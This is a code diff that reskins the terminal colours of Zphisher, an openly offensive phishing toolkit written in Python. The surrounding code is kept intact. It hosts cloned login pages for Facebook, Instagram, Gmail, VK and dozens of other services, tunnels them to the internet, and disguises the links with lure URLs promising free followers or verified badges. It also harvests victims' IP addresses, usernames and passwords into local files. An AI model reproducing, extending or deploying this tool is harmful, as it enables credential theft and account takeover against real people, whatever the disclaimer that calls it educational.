@@ -17,24 +17,16 @@ __version__ = "2.3.5"
 HOST = "127.0.0.1"
 PORT = "8080"
 
-# ANSI colors
-RED = "\033[31m"
-GREEN = "\033[32m"
-ORANGE = "\033[33m"
-BLUE = "\033[34m"
-MAGENTA = "\033[35m"
-CYAN = "\033[36m"
-WHITE = "\033[37m"
-BLACK = "\033[30m"
-REDBG = "\033[41m"
-GREENBG = "\033[42m"
-ORANGEBG = "\033[43m"
-BLUEBG = "\033[44m"
-MAGENTABG = "\033[45m"
-CYANBG = "\033[46m"
-WHITEBG = "\033[47m"
-BLACKBG = "\033[40m"
-RESETBG = "\033[0m"
+# ANSI colors – Deep Blue Luxury Theme
+LIGHT1    = "\033[38;2;77;166;255m"   # Soft Neon Blue Glow
+LIGHT2    = "\033[38;2;30;144;255m"   # Electric Blue Accent
+MEDIUM    = "\033[38;2;10;31;68m"     # Royal Dark Blue
+PURPLE    = "\033[38;2;30;144;255m"   # Electric Blue Accent
+DARK      = "\033[38;2;2;11;26m"      # Midnight Blue
+PINK      = "\033[38;2;255;45;170m"   # Fuchsia Pink
+RESET     = "\033[0m"
+WHITE     = "\033[37m"                 # white for menu numbers
+
 
 BASE_DIR = os.path.dirname(os.path.realpath(__file__))
 
@@ -44,12 +36,12 @@ mask = ""
 
 
 def reset_color():
-    sys.stdout.write(RESETBG + "\n")
+    sys.stdout.write(RESET + "\n")
     sys.stdout.flush()
 
 
 def sig_handler(sig, frame):
-    print(f"\n\n{RED}[{WHITE}!{RED}]{RED} Program Interrupted.")
+    print(f"\n\n{DARK}[{WHITE}!{DARK}]{DARK} Program Interrupted.")
     reset_color()
     sys.exit(0)
 
@@ -84,7 +76,7 @@ def kill_pid():
 
 
 def check_update():
-    print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Checking for update : ", end="")
+    print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Checking for update : ", end="")
     try:
         req = urllib.request.Request(
             "https://api.github.com/repos/htr-tech/zphisher/releases/latest",
@@ -94,61 +86,59 @@ def check_update():
             data = json.loads(response.read().decode("utf-8"))
             new_version = data.get("tag_name", "").strip()
             if new_version and new_version != __version__:
-                print(f"{ORANGE}update found\n{WHITE}")
+                print(f"{LIGHT2}update found\n{LIGHT1}")
                 time.sleep(2)
-                print(f"\n{GREEN}[{WHITE}+{GREEN}]{ORANGE} Downloading Update...")
+                print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Downloading Update...")
                 tarball_url = f"https://github.com/htr-tech/zphisher/archive/refs/tags/{new_version}.tar.gz"
                 # For simplicity, we just prompt the user
                 print(
-                    f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Please manually pull the latest version or download from {tarball_url}"
+                    f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Please manually pull the latest version or download from {tarball_url}"
                 )
             else:
-                print(f"{GREEN}up to date\n{WHITE}")
+                print(f"{PURPLE}up to date\n{LIGHT1}")
                 time.sleep(0.5)
     except Exception:
-        print(f"{RED}Offline{WHITE}")
+        print(f"{DARK}Offline{LIGHT1}")
 
 
 def check_status():
-    print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Internet Status : ", end="")
+    print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Internet Status : ", end="")
     try:
         urllib.request.urlopen("https://api.github.com", timeout=3)
-        print(f"{GREEN}Online{WHITE}")
+        print(f"{PURPLE}Online{LIGHT1}")
         check_update()
     except Exception:
-        print(f"{RED}Offline{WHITE}")
+        print(f"{DARK}Offline{LIGHT1}")
 
 
 def banner():
-    print(f"""{ORANGE}
- ______      _     _     _               
-|___  /     | |   (_)   | |              
-   / / _ __ | |__  _ ___| |__   ___ _ __ 
-  / / | '_ \\| '_ \\| / __| '_ \\ / _ \\ '__|
- / /__| |_) | | | | \\__ \\ | | |  __/ |   
-/_____| .__/|_| |_|_|___/_| |_|\\___|_|   
-      | |                                
-      |_|                {RED}Version : {__version__}
+    print(f"""{MEDIUM} ______      _     _     _               
+{MEDIUM}|___  /     | |   (_)   | |              
+{WHITE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
+{WHITE}  / / | '_ \\| '_ \\| / __| '_ \\ / _ \\ '__|
+{PINK} / /__| |_) | | | | \\__ \\ | | |  __/ |   
+{PINK}/_____| .__/|_| |_|_|___/_| |_|\\___|_|   
+{PINK}      | |                                
+{PINK}      |_|                {PINK}Version : {__version__}
 
-{GREEN}[{WHITE}-{GREEN}]{CYAN} Tool Created by htr-tech (tahmid.rayat){WHITE}""")
+{PURPLE}[{LIGHT1}-{PURPLE}]{PINK} Tool Created by htr-tech (tahmid.rayat){RESET}""")
 
 
 def banner_small():
-    print(f"""{BLUE}
-  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀{WHITE} {__version__}""")
+    print(f"""{MEDIUM}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
+  {WHITE}░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
+  {PINK}░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀{PINK} {__version__}""")
 
 
 def dependencies():
-    print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Checking packages...")
+    print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Checking packages...")
     if platform.system() == "Windows":
         return
     # Skipping deep package checks for python equivalent since python already has standard libs.
     # PHP is required.
     if shutil.which("php") is None:
         print(
-            f"\n{RED}[{WHITE}!{RED}]{RED} PHP is not installed. Please install it manually."
+            f"\n{DARK}[{WHITE}!{DARK}]{DARK} PHP is not installed. Please install it manually."
         )
 
 
@@ -183,7 +173,7 @@ def download(url, output):
         if os.path.exists(file_name):
             os.remove(file_name)
     except Exception as e:
-        print(f"\n{RED}[{WHITE}!{RED}]{RED} Error occurred while downloading {output}.")
+        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Error occurred while downloading {output}.")
         reset_color()
         sys.exit(1)
 
@@ -192,9 +182,9 @@ def install_cloudflared():
     if os.path.exists(".server/cloudflared") or os.path.exists(
         ".server/cloudflared.exe"
     ):
-        print(f"\n{GREEN}[{WHITE}+{GREEN}]{GREEN} Cloudflared already installed.")
+        print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{PURPLE} Cloudflared already installed.")
     else:
-        print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing Cloudflared...{WHITE}")
+        print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Installing Cloudflared...{LIGHT1}")
         arch = platform.machine().lower()
         if platform.system() == "Windows":
             download(
@@ -220,9 +210,9 @@ def install_cloudflared():
 
 def install_localxpose():
     if os.path.exists(".server/loclx") or os.path.exists(".server/loclx.exe"):
-        print(f"\n{GREEN}[{WHITE}+{GREEN}]{GREEN} LocalXpose already installed.")
+        print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{PURPLE} LocalXpose already installed.")
     else:
-        print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing LocalXpose...{WHITE}")
+        print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Installing LocalXpose...{LIGHT1}")
         arch = platform.machine().lower()
         if platform.system() == "Windows":
             download(
@@ -250,7 +240,7 @@ def msg_exit():
     os.system("cls" if os.name == "nt" else "clear")
     banner()
     print(
-        f"\n{GREENBG}{BLACK} Thank you for using this tool. Have a good day.{RESETBG}\n"
+        f"\n{PURPLE}{DARK} Thank you for using this tool. Have a good day.{RESET}\n"
     )
     reset_color()
     sys.exit(0)
@@ -260,32 +250,32 @@ def about():
     os.system("cls" if os.name == "nt" else "clear")
     banner()
     print(f"""
-{GREEN} Author   {RED}:  {ORANGE}TAHMID RAYAT {RED}[ {ORANGE}HTR-TECH {RED}]
-{GREEN} Github   {RED}:  {CYAN}https://github.com/htr-tech
-{GREEN} Social   {RED}:  {CYAN}https://tahmidrayat.is-a.dev
-{GREEN} Version  {RED}:  {ORANGE}{__version__}
+{PURPLE} Author   {DARK}:  {LIGHT2}TAHMID RAYAT {DARK}[ {LIGHT2}HTR-TECH {DARK}]
+{PURPLE} Github   {DARK}:  {LIGHT2}https://github.com/htr-tech
+{PURPLE} Social   {DARK}:  {LIGHT2}https://tahmidrayat.is-a.dev
+{PURPLE} Version  {DARK}:  {LIGHT2}{__version__}
 
-{WHITE} {REDBG}Warning:{RESETBG}
-{CYAN}  This Tool is made for educational purpose 
-  only {RED}!{WHITE}{CYAN} Author will not be responsible for 
-  any misuse of this toolkit {RED}!{WHITE}
+{LIGHT1} {DARK}Warning:{RESET}
+{LIGHT2}  This Tool is made for educational purpose 
+  only {DARK}!{LIGHT1}{LIGHT2} Author will not be responsible for 
+  any misuse of this toolkit {DARK}!{LIGHT1}
 
-{WHITE} {CYANBG}Special Thanks to:{RESETBG}
-{GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
+{LIGHT1} {PURPLE}Special Thanks to:{RESET}
+{PURPLE}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
   KasRoudra, E343IO, sepp0, ThelinuxChoice,
   Yisus7u7
 
-{RED}[{WHITE}00{RED}]{ORANGE} Main Menu     {RED}[{WHITE}99{RED}]{ORANGE} Exit
+{DARK}[{WHITE}00{DARK}]{LIGHT2} Main Menu     {DARK}[{WHITE}99{DARK}]{LIGHT2} Exit
 """)
-    reply = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
+    reply = input(f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}")
     if reply in ["99"]:
         msg_exit()
     elif reply in ["0", "00"]:
-        print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Returning to main menu...")
+        print(f"\n{PURPLE}[{LIGHT1}+{PURPLE}]{LIGHT2} Returning to main menu...")
         time.sleep(1)
         main_menu()
     else:
-        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
+        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
         time.sleep(1)
         about()
 
@@ -294,30 +284,30 @@ def cusport():
     global PORT
     print()
     ans = input(
-        f"{RED}[{WHITE}?{RED}]{ORANGE} Do You Want A Custom Port {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}]: {ORANGE}"
+        f"{DARK}[{WHITE}?{DARK}]{LIGHT2} Do You Want A Custom Port {PURPLE}[{LIGHT2}y{PURPLE}/{LIGHT2}N{PURPLE}]: {LIGHT2}"
     )
     if ans.lower() == "y":
         print("\n")
         cu_p = input(
-            f"{RED}[{WHITE}-{RED}]{ORANGE} Enter Your Custom 4-digit Port [1024-9999] : {WHITE}"
+            f"{DARK}[{WHITE}-{DARK}]{LIGHT2} Enter Your Custom 4-digit Port [1024-9999] : {LIGHT1}"
         )
         if cu_p.isdigit() and 1024 <= int(cu_p) <= 9999:
             PORT = cu_p
             print()
         else:
             print(
-                f"\n\n{RED}[{WHITE}!{RED}]{RED} Invalid 4-digit Port : {cu_p}, Try Again...{WHITE}"
+                f"\n\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid 4-digit Port : {cu_p}, Try Again...{LIGHT1}"
             )
             time.sleep(2)
             os.system("cls" if os.name == "nt" else "clear")
             banner_small()
             cusport()
     else:
-        print(f"\n\n{RED}[{WHITE}-{RED}]{BLUE} Using Default Port {PORT}...{WHITE}\n")
+        print(f"\n\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Using Default Port {PORT}...{LIGHT1}\n")
 
 
 def setup_site():
-    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Setting up server...{WHITE}")
+    print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Setting up server...{LIGHT1}")
     site_dir = os.path.join(".sites", website)
     for item in os.listdir(site_dir):
         s = os.path.join(site_dir, item)
@@ -327,7 +317,7 @@ def setup_site():
         else:
             shutil.copy2(s, d)
     shutil.copy2(".sites/ip.php", ".server/www/ip.php")
-    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Starting PHP server...{WHITE}")
+    print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Starting PHP server...{LIGHT1}")
     subprocess.Popen(
         ["php", "-S", f"{HOST}:{PORT}"],
         cwd=".server/www",
@@ -344,8 +334,8 @@ def capture_ip():
         for line in lines:
             if "IP: " in line:
                 ip = line.split("IP: ")[1].strip()
-        print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Victim's IP : {BLUE}{ip}")
-        print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Saved in : {ORANGE}auth/ip.txt")
+        print(f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Victim's IP : {MEDIUM}{ip}")
+        print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Saved in : {LIGHT2}auth/ip.txt")
         with open("auth/ip.txt", "a") as f:
             f.writelines(lines)
 
@@ -361,30 +351,30 @@ def capture_creds():
                 account = line.split("Username:")[1].strip()
             if "Pass:" in line:
                 password = line.split("Pass:")[1].split(".")[-1].strip()
-        print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Account : {BLUE}{account}")
-        print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Password : {BLUE}{password}")
-        print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Saved in : {ORANGE}auth/usernames.dat")
+        print(f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Account : {MEDIUM}{account}")
+        print(f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Password : {MEDIUM}{password}")
+        print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Saved in : {LIGHT2}auth/usernames.dat")
         with open("auth/usernames.dat", "a") as f:
             f.writelines(lines)
         print(
-            f"\n{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Next Login Info, {BLUE}Ctrl + C {ORANGE}to exit. ",
+            f"\n{DARK}[{WHITE}-{DARK}]{LIGHT2} Waiting for Next Login Info, {MEDIUM}Ctrl + C {LIGHT2}to exit. ",
             end="",
         )
 
 
 def capture_data():
     print(
-        f"\n{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Login Info, {BLUE}Ctrl + C {ORANGE}to exit..."
+        f"\n{DARK}[{WHITE}-{DARK}]{LIGHT2} Waiting for Login Info, {MEDIUM}Ctrl + C {LIGHT2}to exit..."
     )
     try:
         while True:
             if os.path.exists(".server/www/ip.txt"):
-                print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Victim IP Found !")
+                print(f"\n\n{DARK}[{WHITE}-{DARK}]{PURPLE} Victim IP Found !")
                 capture_ip()
                 os.remove(".server/www/ip.txt")
             time.sleep(0.75)
             if os.path.exists(".server/www/usernames.txt"):
-                print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Login info Found !!")
+                print(f"\n\n{DARK}[{WHITE}-{DARK}]{PURPLE} Login info Found !!")
                 capture_creds()
                 os.remove(".server/www/usernames.txt")
             time.sleep(0.75)
@@ -399,24 +389,24 @@ def custom_mask():
     banner_small()
     print()
     mask_op = input(
-        f"{RED}[{WHITE}?{RED}]{ORANGE} Do you want to change Mask URL? {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}] :{ORANGE} "
+        f"{DARK}[{WHITE}?{DARK}]{LIGHT2} Do you want to change Mask URL? {PURPLE}[{LIGHT2}y{PURPLE}/{LIGHT2}N{PURPLE}] :{LIGHT2} "
     )
     print()
     if mask_op.lower() == "y":
         print(
-            f"\n{RED}[{WHITE}-{RED}]{GREEN} Enter your custom URL below {CYAN}({ORANGE}Example: https://get-free-followers.com{CYAN})\n"
+            f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Enter your custom URL below {LIGHT2}({LIGHT2}Example: https://get-free-followers.com{LIGHT2})\n"
         )
-        mask_url = input(f"{WHITE} ==> {ORANGE}")
+        mask_url = input(f"{LIGHT1} ==> {LIGHT2}")
         if mask_url == "":
             mask_url = "https://"
         if mask_url.startswith("http") or mask_url.startswith("www"):
             mask = mask_url
             print(
-                f"\n{RED}[{WHITE}-{RED}]{CYAN} Using custom Masked Url :{GREEN} {mask}"
+                f"\n{DARK}[{WHITE}-{DARK}]{LIGHT2} Using custom Masked Url :{PURPLE} {mask}"
             )
         else:
             print(
-                f"\n{RED}[{WHITE}!{RED}]{ORANGE} Invalid url type..Using the Default one.."
+                f"\n{DARK}[{WHITE}!{DARK}]{LIGHT2} Invalid url type..Using the Default one.."
             )
 
 
@@ -471,10 +461,10 @@ def custom_url(url):
         processed_url = "Unable to Short URL"
         masked_url = ""
 
-    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} URL 1 : {GREEN}{url}")
-    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} URL 2 : {ORANGE}{processed_url}")
+    print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} URL 1 : {PURPLE}{url}")
+    print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} URL 2 : {LIGHT2}{processed_url}")
     if "Unable" not in processed_url:
-        print(f"\n{RED}[{WHITE}-{RED}]{BLUE} URL 3 : {ORANGE}{masked_url}")
+        print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} URL 3 : {LIGHT2}{masked_url}")
 
 
 def start_cloudflared():
@@ -482,11 +472,11 @@ def start_cloudflared():
         os.remove(".server/.cld.log")
     cusport()
     print(
-        f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})"
+        f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Initializing... {PURPLE}( {LIGHT2}http://{HOST}:{PORT} {PURPLE})"
     )
     time.sleep(1)
     setup_site()
-    print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Launching Cloudflared...")
+    print(f"\n\n{DARK}[{WHITE}-{DARK}]{PURPLE} Launching Cloudflared...")
 
     cld_bin = (
         ".server/cloudflared.exe"
@@ -532,14 +522,14 @@ def localxpose_auth():
     )
     if "Error" in status.stdout or "Error" in status.stderr:
         print(
-            f"\n\n{RED}[{WHITE}!{RED}]{GREEN} Create an account on {ORANGE}localxpose.io{GREEN} & copy the token\n"
+            f"\n\n{DARK}[{WHITE}!{DARK}]{PURPLE} Create an account on {LIGHT2}localxpose.io{PURPLE} & copy the token\n"
         )
         time.sleep(3)
         loclx_token = input(
-            f"{RED}[{WHITE}-{RED}]{ORANGE} Input Loclx Token :{ORANGE} "
+            f"{DARK}[{WHITE}-{DARK}]{LIGHT2} Input Loclx Token :{LIGHT2} "
         )
         if not loclx_token:
-            print(f"\n{RED}[{WHITE}!{RED}]{RED} You have to input Localxpose Token.")
+            print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} You have to input Localxpose Token.")
             time.sleep(2)
             tunnel_menu()
         else:
@@ -550,7 +540,7 @@ def localxpose_auth():
 def start_loclx():
     cusport()
     print(
-        f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})"
+        f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Initializing... {PURPLE}( {LIGHT2}http://{HOST}:{PORT} {PURPLE})"
     )
     time.sleep(1)
     setup_site()
@@ -558,10 +548,10 @@ def start_loclx():
 
     print("\n")
     opinion = input(
-        f"{RED}[{WHITE}?{RED}]{ORANGE} Change Loclx Server Region? {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}]:{ORANGE} "
+        f"{DARK}[{WHITE}?{DARK}]{LIGHT2} Change Loclx Server Region? {PURPLE}[{LIGHT2}y{PURPLE}/{LIGHT2}N{PURPLE}]:{LIGHT2} "
     )
     loclx_region = "eu" if opinion.lower() == "y" else "us"
-    print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Launching LocalXpose...")
+    print(f"\n\n{DARK}[{WHITE}-{DARK}]{PURPLE} Launching LocalXpose...")
 
     loclx_bin = (
         ".server/loclx.exe" if platform.system() == "Windows" else "./.server/loclx"
@@ -599,14 +589,14 @@ def start_loclx():
 def start_localhost():
     cusport()
     print(
-        f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})"
+        f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Initializing... {PURPLE}( {LIGHT2}http://{HOST}:{PORT} {PURPLE})"
     )
     setup_site()
     time.sleep(1)
     os.system("cls" if os.name == "nt" else "clear")
     banner_small()
     print(
-        f"\n{RED}[{WHITE}-{RED}]{GREEN} Successfully Hosted at : {GREEN}{CYAN}http://{HOST}:{PORT} {GREEN}"
+        f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Successfully Hosted at : {PURPLE}{LIGHT2}http://{HOST}:{PORT} {PURPLE}"
     )
     capture_data()
 
@@ -615,12 +605,12 @@ def tunnel_menu():
     os.system("cls" if os.name == "nt" else "clear")
     banner_small()
     print(f"""
-{RED}[{WHITE}01{RED}]{ORANGE} Localhost
-{RED}[{WHITE}02{RED}]{ORANGE} Cloudflared  {RED}[{CYAN}Auto Detects{RED}]
-{RED}[{WHITE}03{RED}]{ORANGE} LocalXpose   {RED}[{CYAN}NEW! Max 15Min{RED}]
+{DARK}[{WHITE}01{DARK}]{LIGHT2} Localhost
+{DARK}[{WHITE}02{DARK}]{LIGHT2} Cloudflared  {DARK}[{LIGHT2}Auto Detects{DARK}]
+{DARK}[{WHITE}03{DARK}]{LIGHT2} LocalXpose   {DARK}[{LIGHT2}NEW! Max 15Min{DARK}]
 """)
     reply = input(
-        f"{RED}[{WHITE}-{RED}]{GREEN} Select a port forwarding service : {BLUE}"
+        f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select a port forwarding service : {MEDIUM}"
     )
     if reply in ["1", "01"]:
         start_localhost()
@@ -629,7 +619,7 @@ def tunnel_menu():
     elif reply in ["3", "03"]:
         start_loclx()
     else:
-        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
+        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
         time.sleep(1)
         tunnel_menu()
 
@@ -637,12 +627,12 @@ def tunnel_menu():
 def site_facebook():
     global website, mask
     print(f"""
-{RED}[{WHITE}01{RED}]{ORANGE} Traditional Login Page
-{RED}[{WHITE}02{RED}]{ORANGE} Advanced Voting Poll Login Page
-{RED}[{WHITE}03{RED}]{ORANGE} Fake Security Login Page
-{RED}[{WHITE}04{RED}]{ORANGE} Facebook Messenger Login Page
+{DARK}[{WHITE}01{DARK}]{LIGHT2} Traditional Login Page
+{DARK}[{WHITE}02{DARK}]{LIGHT2} Advanced Voting Poll Login Page
+{DARK}[{WHITE}03{DARK}]{LIGHT2} Fake Security Login Page
+{DARK}[{WHITE}04{DARK}]{LIGHT2} Facebook Messenger Login Page
 """)
-    reply = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
+    reply = input(f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}")
     if reply in ["1", "01"]:
         website = "facebook"
         mask = "https://blue-verified-badge-for-facebook-free"
@@ -660,7 +650,7 @@ def site_facebook():
         mask = "https://get-messenger-premium-features-free"
         tunnel_menu()
     else:
-        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
+        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
         time.sleep(1)
         os.system("cls" if os.name == "nt" else "clear")
         banner_small()
@@ -670,12 +660,12 @@ def site_facebook():
 def site_instagram():
     global website, mask
     print(f"""
-{RED}[{WHITE}01{RED}]{ORANGE} Traditional Login Page
-{RED}[{WHITE}02{RED}]{ORANGE} Auto Followers Login Page
-{RED}[{WHITE}03{RED}]{ORANGE} 1000 Followers Login Page
-{RED}[{WHITE}04{RED}]{ORANGE} Blue Badge Verify Login Page
+{DARK}[{WHITE}01{DARK}]{LIGHT2} Traditional Login Page
+{DARK}[{WHITE}02{DARK}]{LIGHT2} Auto Followers Login Page
+{DARK}[{WHITE}03{DARK}]{LIGHT2} 1000 Followers Login Page
+{DARK}[{WHITE}04{DARK}]{LIGHT2} Blue Badge Verify Login Page
 """)
-    reply = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
+    reply = input(f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}")
     if reply in ["1", "01"]:
         website = "instagram"
         mask = "https://get-unlimited-followers-for-instagram"
@@ -693,7 +683,7 @@ def site_instagram():
         mask = "https://blue-badge-verify-for-instagram-free"
         tunnel_menu()
     else:
-        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
+        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
         time.sleep(1)
         os.system("cls" if os.name == "nt" else "clear")
         banner_small()
@@ -703,11 +693,11 @@ def site_instagram():
 def site_gmail():
     global website, mask
     print(f"""
-{RED}[{WHITE}01{RED}]{ORANGE} Gmail Old Login Page
-{RED}[{WHITE}02{RED}]{ORANGE} Gmail New Login Page
-{RED}[{WHITE}03{RED}]{ORANGE} Advanced Voting Poll
+{DARK}[{WHITE}01{DARK}]{LIGHT2} Gmail Old Login Page
+{DARK}[{WHITE}02{DARK}]{LIGHT2} Gmail New Login Page
+{DARK}[{WHITE}03{DARK}]{LIGHT2} Advanced Voting Poll
 """)
-    reply = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
+    reply = input(f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}")
     if reply in ["1", "01"]:
         website = "google"
         mask = "https://get-unlimited-google-drive-free"
@@ -721,7 +711,7 @@ def site_gmail():
         mask = "https://vote-for-the-best-social-media"
         tunnel_menu()
     else:
-        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
+        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
         time.sleep(1)
         os.system("cls" if os.name == "nt" else "clear")
         banner_small()
@@ -731,10 +721,10 @@ def site_gmail():
 def site_vk():
     global website, mask
     print(f"""
-{RED}[{WHITE}01{RED}]{ORANGE} Traditional Login Page
-{RED}[{WHITE}02{RED}]{ORANGE} Advanced Voting Poll Login Page
+{DARK}[{WHITE}01{DARK}]{LIGHT2} Traditional Login Page
+{DARK}[{WHITE}02{DARK}]{LIGHT2} Advanced Voting Poll Login Page
 """)
-    reply = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select an option : {BLUE}")
+    reply = input(f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}")
     if reply in ["1", "01"]:
         website = "vk"
         mask = "https://vk-premium-real-method-2020"
@@ -744,7 +734,7 @@ def site_vk():
         mask = "https://vote-for-the-best-social-media"
         tunnel_menu()
     else:
-        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
+        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
         time.sleep(1)
         os.system("cls" if os.name == "nt" else "clear")
         banner_small()
@@ -756,24 +746,24 @@ def main_menu():
     os.system("cls" if os.name == "nt" else "clear")
     banner()
     print(f"""
-{RED}[{WHITE}::{RED}]{ORANGE} Select An Attack For Your Victim {RED}[{WHITE}::{RED}]{ORANGE}
+{DARK}[{WHITE}::{DARK}]{LIGHT2} Select An Attack For Your Victim {DARK}[{WHITE}::{DARK}]{LIGHT2}
 
-{RED}[{WHITE}01{RED}]{BLUE} Facebook      {RED}[{WHITE}11{RED}]{ORANGE} Twitch       {RED}[{WHITE}21{RED}]{ORANGE} DeviantArt
-{RED}[{WHITE}02{RED}]{BLUE} Instagram     {RED}[{WHITE}12{RED}]{ORANGE} Pinterest    {RED}[{WHITE}22{RED}]{ORANGE} Badoo
-{RED}[{WHITE}03{RED}]{ORANGE} Google        {RED}[{WHITE}13{RED}]{ORANGE} Snapchat     {RED}[{WHITE}23{RED}]{ORANGE} Origin
-{RED}[{WHITE}04{RED}]{ORANGE} Microsoft     {RED}[{WHITE}14{RED}]{ORANGE} Linkedin     {RED}[{WHITE}24{RED}]{ORANGE} DropBox	
-{RED}[{WHITE}05{RED}]{ORANGE} Netflix       {RED}[{WHITE}15{RED}]{ORANGE} Ebay         {RED}[{WHITE}25{RED}]{ORANGE} Yahoo		
-{RED}[{WHITE}06{RED}]{ORANGE} Paypal        {RED}[{WHITE}16{RED}]{ORANGE} Quora        {RED}[{WHITE}26{RED}]{ORANGE} Wordpress
-{RED}[{WHITE}07{RED}]{ORANGE} Steam         {RED}[{WHITE}17{RED}]{ORANGE} Protonmail   {RED}[{WHITE}27{RED}]{ORANGE} Yandex			
-{RED}[{WHITE}08{RED}]{ORANGE} Twitter       {RED}[{WHITE}18{RED}]{ORANGE} Spotify      {RED}[{WHITE}28{RED}]{ORANGE} StackoverFlow
-{RED}[{WHITE}09{RED}]{ORANGE} Playstation   {RED}[{WHITE}19{RED}]{ORANGE} Reddit       {RED}[{WHITE}29{RED}]{ORANGE} Vk
-{RED}[{WHITE}10{RED}]{ORANGE} Tiktok        {RED}[{WHITE}20{RED}]{ORANGE} Adobe        {RED}[{WHITE}30{RED}]{ORANGE} XBOX
-{RED}[{WHITE}31{RED}]{ORANGE} Mediafire     {RED}[{WHITE}32{RED}]{ORANGE} Gitlab       {RED}[{WHITE}33{RED}]{ORANGE} Github
